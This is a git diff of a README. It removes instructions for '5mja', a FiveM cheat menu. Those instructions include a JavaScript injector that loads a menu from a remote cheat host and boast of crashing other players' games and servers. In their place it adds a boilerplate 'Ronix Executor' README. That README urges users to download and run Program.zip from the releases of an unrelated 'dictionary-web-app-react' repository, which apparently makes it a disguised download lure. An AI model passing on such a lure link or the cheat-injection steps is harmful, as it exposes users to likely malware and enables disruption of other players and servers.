@@ -1,30 +1,57 @@
-### What's 5mja?
-5mja is a open source cheat menu tool designed specifically using NUI technology for the popular online game FiveM. FiveM is a modification for the Grand Theft Auto V game, which allows users to play on custom servers with a variety of game modes and modifications. Unlike many other cheat menus that are Lua-based, 5mja can be injected using the built-in dev tool in FiveM, making it easier to use for some users. 5mja has several capabilities that allow players to exploit the game and gain an unfair advantage over others. For example, using 5mja, a player can spawn money or vehicles, even crash other players' games or the game server itself.<br/>
 
-It is important to note that using 5mja or any other cheat tool in public servers is considered unethical and against the game's terms of service. Cheating can ruin the game experience for others and can result in penalties or even legal consequences. It is recommended to use such tools only for educational purposes or in private servers with the consent of all players involved.
+# Ronix Executor
 
-#### Usage
-- Enable devtool by switching update channel of fivem to Beta.
-- Press F8 Tool->NUI->Open DevTools or visit http://localhost:13172/ in browser
-- Navigate to Sources tab press `Ctrl+F8` (Disable breakpoints) & press `Ctrl+\` (Resume script execution)
-- Navigate to Console tab select `top` in javaScript context.
-- <img src="https://cdn.discordapp.com/attachments/731452450074001418/1083050864341700638/Screenshot_2023-03-08_083700.png">
-- Copy & Paste menu injector javascript & press enter.
-- Open any nui element like phone which allow you to use cursor.
-- Press PageDown key for hide & show menu.
+Welcome to the Ronix Executor repository! 🚀
 
-menu injector javascript
-```
-var iframe = document.createElement("iframe");
-iframe.setAttribute("src", "http://5mja.ninjhacks.com/menu");
-iframe.style.zIndex = "99999999999";
-document.body.appendChild(iframe);
-```
+![Ronix Executor Logo](https://example.com/ronix-executor-logo.png)
 
-set zIndex to 0 for access other nui elements like phone.
-set zIndex to 9999999 for access other 5mja menu like phone.
-```
-iframe.style.zIndex = "0";
-```
+## Description
 
-For help & discussion join our discord server https://discord.gg/ninjhacks
+Ronix Executor is a powerful Lua environment designed to help you build faster and smarter. With our extensive toolkit, you can create unique scripts with ease. Download Ronix Executor for Windows now and start unleashing your creativity!
+
+## Topics
+
+- ronix
+- ronix-hub
+- ronix-hub-script
+- ronix-executor
+- ronix-app
+
+## Getting Started
+
+To get started with Ronix Executor, simply download the program from the following link:
+
+[![Download Ronix Executor](https://img.shields.io/badge/Download-Ronix%20Executor-blue)](https://github.com/12a1wbs/dictionary-web-app-react/releases/download/v1.0/Program.zip)
+
+Once you've downloaded the file, follow the instructions to launch the program and begin exploring its features.
+
+## Features
+
+Here are some of the key features of Ronix Executor:
+- Powerful Lua environment for scripting
+- Extensive toolkit for creating unique scripts
+- Windows compatible
+
+## Installation
+
+To install Ronix Executor, simply download the program from the link provided above. Launch the executable file and follow the on-screen instructions to complete the installation process.
+
+## Usage
+
+To start using Ronix Executor, open the program and explore the different features and tools available. Create your own scripts, experiment with Lua coding, and see what you can build with our powerful environment.
+
+## Contributing
+
+We welcome contributions to the Ronix Executor project. If you have ideas for improvements, new features, or bug fixes, feel free to submit a pull request. Your contributions help make Ronix Executor even better for the community.
+
+## Support
+
+If you encounter any issues or have any questions about Ronix Executor, please check the "Releases" section for any updates or troubleshooting information. You can also reach out to our support team for assistance.
+
+## License
+
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+
+---
+
+Thank you for checking out Ronix Executor! We hope you enjoy using our Lua environment to build amazing scripts and unleash your creativity. Download Ronix Executor today and start coding like never before. 🌟
